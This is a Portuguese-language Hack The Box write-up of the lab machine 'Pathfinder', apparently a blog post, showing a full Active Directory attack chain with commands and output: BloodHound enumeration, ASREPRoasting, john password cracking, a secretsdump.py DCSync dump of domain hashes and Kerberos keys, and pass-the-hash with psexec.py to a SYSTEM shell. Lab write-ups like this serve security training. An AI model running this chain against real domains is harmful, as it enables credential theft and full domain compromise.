@@ -1,0 +1,303 @@
+<p><img src="/img/htb/htb-pathfinder-logo.png" /></p>
+
+<p><br /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Nome</th>
+      <th>Pathfinder</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.30</td>
+    </tr>
+    <tr>
+      <td>Pontos</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>OS</td>
+      <td>Windows</td>
+    </tr>
+    <tr>
+      <td>Nível</td>
+      <td>Very Easy</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><br /></p>
+
+<h2 id="recon">RECON</h2>
+
+<h3 id="nmap">Nmap</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-sCV</span> <span class="nt">-O</span> <span class="nt">-Pn</span> 10.10.10.30 <span class="nt">--min-rate</span><span class="o">=</span>512
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2021-09-08 04:15:02Z<span class="o">)</span>
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49672/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc         Microsoft Windows RPC
+49683/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49718/tcp open  msrpc         Microsoft Windows RPC
+
+</code></pre></div></div>
+<p>Encontramos várias portas abertas nesta máquina, percebemos que temos o LDAP na porta 389 e o Kerberos na porta 88.
+Também temos o WinRM na porta 5985, estas informações indicam que estamos lidando com um Domain Controller.</p>
+
+<h3 id="active-directory">Active Directory</h3>
+
+<p>Desta vez, precisaremos fazer uma análise gráfica do AD, para tanto, vamos precisar de algumas ferramentas.
+A primeira delas é o injester <code class="language-plaintext highlighter-rouge">bloodhound</code> do python que pode ser instalado através do comando <code class="language-plaintext highlighter-rouge">pip install bloodhound</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>pip <span class="nb">install </span>bloodhound
+Collecting bloodhound
+  Downloading bloodhound-1.1.1-py3-none-any.whl <span class="o">(</span>65 kB<span class="o">)</span>
+     |████████████████████████████████| 65 kB 2.4 MB/s 
+Requirement already satisfied: future <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.18.2<span class="o">)</span>
+Requirement already satisfied: pyasn1&gt;<span class="o">=</span>0.4 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.4.8<span class="o">)</span>
+Requirement already satisfied: impacket&gt;<span class="o">=</span>0.9.17 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>0.9.22<span class="o">)</span>
+Requirement already satisfied: dnspython <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>2.0.0<span class="o">)</span>
+Requirement already satisfied: ldap3!<span class="o">=</span>2.5.0,!<span class="o">=</span>2.5.2,!<span class="o">=</span>2.6,&gt;<span class="o">=</span>2.5 <span class="k">in</span> /usr/lib/python3/dist-packages <span class="o">(</span>from bloodhound<span class="o">)</span> <span class="o">(</span>2.8.1<span class="o">)</span>
+Installing collected packages: bloodhound
+  WARNING: The script bloodhound-python is installed <span class="k">in</span> <span class="s1">'/home/hastur/.local/bin'</span> which is not on PATH.
+  Consider adding this directory to PATH or, <span class="k">if </span>you prefer to suppress this warning, use <span class="nt">--no-warn-script-location</span><span class="nb">.</span>
+Successfully installed bloodhound-1.1.1
+</code></pre></div></div>
+
+<p>Como já temos as credenciais <code class="language-plaintext highlighter-rouge">sandra:Password1234!</code> obitadas na máquina anterior (<a href="https://hastur666.github.io/posts/htb-shield-writeup/">Shield</a>), vamos tentar obter informações do AD.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>python3 <span class="nt">-m</span> bloodhound <span class="nt">-d</span> megacorp.local <span class="nt">-u</span> sandra <span class="nt">-p</span> <span class="s1">'Password1234!'</span> <span class="nt">-gc</span> pathfinder.megacorp.local <span class="nt">-c</span> all <span class="nt">-ns</span> 10.10.10.30                                                                                                          130 ⨯
+INFO: Found AD domain: megacorp.local
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains <span class="k">in </span>the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCAL
+INFO: Found 5 <span class="nb">users
+</span>INFO: Connecting to GC LDAP server: pathfinder.megacorp.local
+INFO: Found 51 <span class="nb">groups
+</span>INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: Pathfinder.MEGACORP.LOCAL
+INFO: Done <span class="k">in </span>00M 39S
+</code></pre></div></div>
+<p>A autenticação aconteceu com sucesso, e o bloodhound salvou alguns arquivos <code class="language-plaintext highlighter-rouge">.json</code> com as informações do AD em nosso diretório de trabalho.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 116
+drwxr-xr-x  2 hastur hastur  4096 Sep  7 18:12 <span class="nb">.</span>
+drwxr-xr-x 31 hastur hastur  4096 Sep  7 17:58 ..
+<span class="nt">-rw-r--r--</span>  1 hastur hastur  3370 Sep  7 18:12 20210907181146_computers.json
+<span class="nt">-rw-r--r--</span>  1 hastur hastur  3243 Sep  7 18:12 20210907181146_domains.json
+<span class="nt">-rw-r--r--</span>  1 hastur hastur 85362 Sep  7 18:12 20210907181146_groups.json
+<span class="nt">-rw-r--r--</span>  1 hastur hastur 12521 Sep  7 18:12 20210907181146_users.json
+</code></pre></div></div>
+<p>Para conseguirmos de fato analisar estas informações, precisaremos de mais duas aplicações: o <code class="language-plaintext highlighter-rouge">neo4j</code> e o <code class="language-plaintext highlighter-rouge">bloodhound</code> que podem ser instalados com o comando <code class="language-plaintext highlighter-rouge">sudo apt install neo4j bloodhound</code>.</p>
+
+<h3 id="preparando-o-ambiente">Preparando o ambiente</h3>
+
+<p>Antes de iniciarmos, precisamos configurar o ambiente com o neo4j e bloodhount.
+Primeiro vamos iniciar o neo4j <code class="language-plaintext highlighter-rouge">sudo neo4j console</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span><span class="nb">sudo </span>neo4j console
+Directories <span class="k">in </span>use:
+  home:         /usr/share/neo4j
+  config:       /usr/share/neo4j/conf
+  logs:         /usr/share/neo4j/logs
+  plugins:      /usr/share/neo4j/plugins
+  import:       /usr/share/neo4j/import
+  data:         /usr/share/neo4j/data
+  certificates: /usr/share/neo4j/certificates
+  run:          /usr/share/neo4j/run
+Starting Neo4j.
+WARNING: Max 1024 open files allowed, minimum of 40000 recommended. See the Neo4j manual.
+2021-09-07 22:20:53.094+0000 INFO  Starting...
+2021-09-07 22:20:54.732+0000 INFO  <span class="o">========</span> Neo4j 4.2.1 <span class="o">========</span>
+2021-09-07 22:20:56.115+0000 INFO  Initializing system graph model <span class="k">for </span>component <span class="s1">'security-users'</span> with version <span class="nt">-1</span> and status UNINITIALIZED
+2021-09-07 22:20:56.122+0000 INFO  Setting up initial user from defaults: neo4j
+2021-09-07 22:20:56.122+0000 INFO  Creating new user <span class="s1">'neo4j'</span> <span class="o">(</span><span class="nv">passwordChangeRequired</span><span class="o">=</span><span class="nb">true</span>, <span class="nv">suspended</span><span class="o">=</span><span class="nb">false</span><span class="o">)</span>
+2021-09-07 22:20:56.129+0000 INFO  Setting version <span class="k">for</span> <span class="s1">'security-users'</span> to 2
+2021-09-07 22:20:56.132+0000 INFO  After initialization of system graph model component <span class="s1">'security-users'</span> have version 2 and status CURRENT
+2021-09-07 22:20:56.136+0000 INFO  Performing postInitialization step <span class="k">for </span>component <span class="s1">'security-users'</span> with version 2 and status CURRENT
+2021-09-07 22:20:56.350+0000 INFO  Bolt enabled on localhost:7687.
+2021-09-07 22:20:57.116+0000 INFO  Remote interface available at http://localhost:7474/
+2021-09-07 22:20:57.116+0000 INFO  Started.
+</code></pre></div></div>
+<p>Ele irá abrir na porta 7474 que pode ser acessado pelo browser.</p>
+
+<p><img src="/img/htb/htb-pathfinder-1.png" /></p>
+
+<p>As credenciais iniciais para utilizá-lo, são <code class="language-plaintext highlighter-rouge">neo4j:neo4j</code>. Logo no primeiro acesso, ele pedirá para trocar a senha de acesso.</p>
+
+<p>Agora precisamos iniciar o bloodhound com o comando <code class="language-plaintext highlighter-rouge">bloodhound --no-sandbox</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>bloodhound <span class="nt">--no-sandbox</span>
+<span class="o">(</span>node:2824<span class="o">)</span> <span class="o">[</span>DEP0005] DeprecationWarning: Buffer<span class="o">()</span> is deprecated due to security and usability issues. Please use the Buffer.alloc<span class="o">()</span>, Buffer.allocUnsafe<span class="o">()</span>, or Buffer.from<span class="o">()</span> methods instead.
+</code></pre></div></div>
+
+<p><img src="/img/htb/htb-pathfinder-2.png" /></p>
+
+<p>Ele irá solicitar as credenciais do <code class="language-plaintext highlighter-rouge">neo4j</code>.</p>
+
+<p>Para facilitar a importação dos dados, podemos compactar todos os arquivos .jsob que obtivemos e, em seguida, arrastar o arquivo .zip para dentro do bloodhound.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>zip pathfinder.zip <span class="k">*</span>.json
+  adding: 20210907181146_computers.json <span class="o">(</span>deflated 74%<span class="o">)</span>
+  adding: 20210907181146_domains.json <span class="o">(</span>deflated 85%<span class="o">)</span>
+  adding: 20210907181146_groups.json <span class="o">(</span>deflated 95%<span class="o">)</span>
+  adding: 20210907181146_users.json <span class="o">(</span>deflated 91%<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Após a importação, temos várias querys que podemos fazer, mas utilizaremos duas.
+Em <code class="language-plaintext highlighter-rouge">Analysis</code>, primeiro clicamos em <code class="language-plaintext highlighter-rouge">Shortest Paths to High value Targets</code> e depois em <code class="language-plaintext highlighter-rouge">Find Principles with DCSync Rights</code>.</p>
+
+<p><img src="/img/htb/htb-pathfinder-3.png" /></p>
+
+<p>Este mapa nos mostra a distância que cada usuário tem do Domain Controller e seus respectivos privilégios.</p>
+
+<p><img src="/img/htb/htb-pathfinder-4.png" /></p>
+
+<p>Podemos ver que o usuário <code class="language-plaintext highlighter-rouge">svc_bes</code> se liga diretamente ao DC e tem privilégios <code class="language-plaintext highlighter-rouge">GetChangesAll</code>. Isso significa que este usuário tem privilégios de solicitar informações sensíveis do DC, inclusive hashes de senhas.</p>
+
+<h3 id="escalação-de-privilégios-horizontal">Escalação de privilégios horizontal</h3>
+
+<p>Podemos fazer uma tentativa de PrivEsc Horizontal, ao tentar acesso com o usuário <code class="language-plaintext highlighter-rouge">svc_bes</code>, para tanto, precisamos checar se a pré-autenticação do Kerberos está desabilitada para esta conta. Se sim, o DC está vulnerável a <a href="https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/">ASREPRoasting</a>.</p>
+
+<p>Vamos utilizar o <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> para verificar.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/svc_bes <span class="nt">-request</span> <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 10.10.10.30
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>svc_bes
+<span class="nv">$krb5asrep$23$svc_bes</span>@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda<span class="nv">$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774</span>
+</code></pre></div></div>
+<p>Conseguimos um <code class="language-plaintext highlighter-rouge">TGT ticket</code> para o usuário svc_bes!!!</p>
+
+<p>Vamos salvar este ticket no arquivo <code class="language-plaintext highlighter-rouge">hash</code> e tentar quebrá-lo com o <code class="language-plaintext highlighter-rouge">john</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'$krb5asrep$23$svc_bes@MEGACORP.LOCAL:73e00be48dcb9672655c008a25665eda$2e43937963ba72aeda130ab7f779f22a9bd1c5526fe6f70ae93c30beeb9266ef5a55c258b0bdca4f86706866d14f0fdff126ca6100e97e7873399243fab54231776f227db65352acec98a8b37fee5e33f1cba334254e60d724cef56a5d481db3fb5e3060274237748dc7bae98b5b1dbdc1a3e6512f9437d4e244ade19d8da1aef42b5a718696f5c4caafc779092d6b7bd03671083569feb0b8789fe16b27afe53afdfc417a347c8db69738c5593ec54f5c2d2e2d86d9fab115475a474940a5edc2876b22b13fe1e60b6642ca01c0830cd11222b0d0292ab62a8bd97732ab04f9778763e1a80ee18267f6914a1580a774'</span> <span class="o">&gt;</span> <span class="nb">hash</span>
+                                                                                                                                                                                                                                             
+┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>john <span class="nb">hash</span> <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+Sheffield19      <span class="o">(</span><span class="nv">$krb5asrep$23$svc_bes</span>@MEGACORP.LOCAL<span class="o">)</span>
+1g 0:00:00:05 DONE <span class="o">(</span>2021-09-07 18:44<span class="o">)</span> 0.1754g/s 1860Kp/s 1860Kc/s 1860KC/s Sherbear94..Shanelee
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<p>E conseguimos as credenciais <code class="language-plaintext highlighter-rouge">svc_bes:Sheffield19</code>.</p>
+
+<p>Podemos utilizar o <code class="language-plaintext highlighter-rouge">evil-winrm</code> para acesso reoto. Ele pode ser instalado com o comando <code class="language-plaintext highlighter-rouge">sudo gem install evil-winrm</code>.</p>
+
+<p><img src="/img/htb/htb-pathfinder-5.png" /></p>
+
+<p>E conseguimos o shell!!
+A flag <code class="language-plaintext highlighter-rouge">user.txt</code> se encontra no Desktop do usuário.</p>
+
+<h3 id="escalação-de-privilégios-vertical">Escalação de privilégios vertical</h3>
+
+<p>Como nosso usuário tem permissões <code class="language-plaintext highlighter-rouge">GetChangesAll</code>, podemos utilizar o <code class="language-plaintext highlighter-rouge">secretsdump.py</code> para conseguir a hash do administrador do DC.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-dc-ip</span> 10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30                                                                                                  126 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span>-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f9f700dbf7b492969aac5943dab22ff3:::
+svc_bes:1104:aad3b435b51404eeaad3b435b51404ee:0d1ce37b8c9e5cf4dbd20f5b88d5baca:::
+sandra:1105:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+PATHFINDER<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:7e2b4bffb0d54e17b7528cb122bae602:::
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:056bbaf3be0f9a291fe9d18d1e3fa9e6e4aff65ef2785c3fdc4f6472534d614f
+Administrator:aes128-cts-hmac-sha1-96:5235da455da08703cc108293d2b3fa1b
+Administrator:des-cbc-md5:f1c89e75a42cd0fb
+krbtgt:aes256-cts-hmac-sha1-96:d6560366b08e11fa4a342ccd3fea07e69d852f927537430945d9a0ef78f7dd5d
+krbtgt:aes128-cts-hmac-sha1-96:02abd84373491e3d4655e7210beb65ce
+krbtgt:des-cbc-md5:d0f8d0c86ee9d997
+svc_bes:aes256-cts-hmac-sha1-96:2712a119403ab640d89f5d0ee6ecafb449c21bc290ad7d46a0756d1009849238
+svc_bes:aes128-cts-hmac-sha1-96:7d671ab13aa8f3dbd9f4d8e652928ca0
+svc_bes:des-cbc-md5:1cc16e37ef8940b5
+sandra:aes256-cts-hmac-sha1-96:2ddacc98eedadf24c2839fa3bac97432072cfac0fc432cfba9980408c929d810
+sandra:aes128-cts-hmac-sha1-96:c399018a1369958d0f5b242e5eb72e44
+sandra:des-cbc-md5:23988f7a9d679d37
+PATHFINDER<span class="nv">$:</span>aes256-cts-hmac-sha1-96:9e07592ae55cfd43c84e85a477854c8e3f40c70630ea24bebdeda66a15e77e18
+PATHFINDER<span class="nv">$:</span>aes128-cts-hmac-sha1-96:4de068761918fa0005de10f361b49703
+PATHFINDER<span class="nv">$:</span>des-cbc-md5:6d37cd7904b6f7f2
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up... 
+</code></pre></div></div>
+
+<p>Com a hash do administrador, podemos utilizar a técnica de <code class="language-plaintext highlighter-rouge">Pass The Hash</code> (PTH), onde conseguimos nos autenticar no host não com a senha, mas com a hash do usuário. Para isso podemos utilizar o <code class="language-plaintext highlighter-rouge">psexec.py</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>hastur㉿hastur<span class="o">)</span>-[~/Pathfinder]
+└─<span class="nv">$ </span>python3 /usr/share/doc/python3-impacket/examples/psexec.py megacorp.local/administrator@10.10.10.30 <span class="nt">-hashes</span> aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.30.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file vpCRwyDb.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.30.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service btXJ on 10.10.10.30.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service btXJ.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.17763.107]
+<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p><img src="/img/htb/htb-pathfinder-6.png" /></p>
+
+<p>E conseguimos shell como administrador!!!
+A flag <code class="language-plaintext highlighter-rouge">root.txt</code> se encontra no Desktop do Administrator.</p>
+
+<p><br /></p>
+
+<p>E comprometemos o server!!
+<br /></p>
+
+<p><img src="/img/htb/hackerman.gif" /></p>
+
